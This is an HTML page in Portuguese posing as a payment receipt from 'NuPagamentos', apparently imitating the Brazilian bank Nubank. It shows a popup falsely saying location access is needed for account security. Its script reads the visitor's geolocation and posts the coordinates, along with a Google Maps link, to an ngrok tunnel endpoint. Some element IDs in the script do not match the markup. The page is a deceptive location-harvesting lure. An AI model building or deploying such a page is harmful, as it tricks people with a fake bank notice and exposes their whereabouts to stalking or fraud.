<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento</title>
  <link rel="stylesheet" href="styles.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
</head>

<body style="background-color: #6B02A3">

  <!-- Adicionando a mensagem para pedir a localização -->
  <input type="checkbox" id="show-popup" style="display: none;">
<div id="location-popup" class="popup">
  <div class="popup-content">
    <p>Para garantir a segurança da sua conta, a NuPagamentos solicita sua autorização para acessar a localização e fornecer o comprovante de forma segura.</p>
    <label for="show-popup" class="popup-button">Sim, enviar localização</label>
    <label for="show-popup" class="popup-button">Não, obrigado</label>
  </div>
</div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      // Esconde os botões de localização inicialmente
      document.getElementById('popup-button').style.display = 'block';

      // Ao clicar em "Sim", solicitar a localização
      document.getElementById('allow-location').addEventListener('click', () => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendLocation, handleError);
          // Após solicitar, esconder os botões
          document.getElementById('popup-content').style.display = 'none';
        } else {
          alert("Algo deu errado. Tente novamente mais tarde.");
        }
      });

      // Ao clicar em "Não", apenas esconder a solicitação
      document.getElementById('deny-location').addEventListener('click', () => {
        document.getElementById('popup-content').style.display = 'none';
      });
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://268f-2804-6950-a-39f1-9cc6-68e5-b196-3d38.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>

</html>
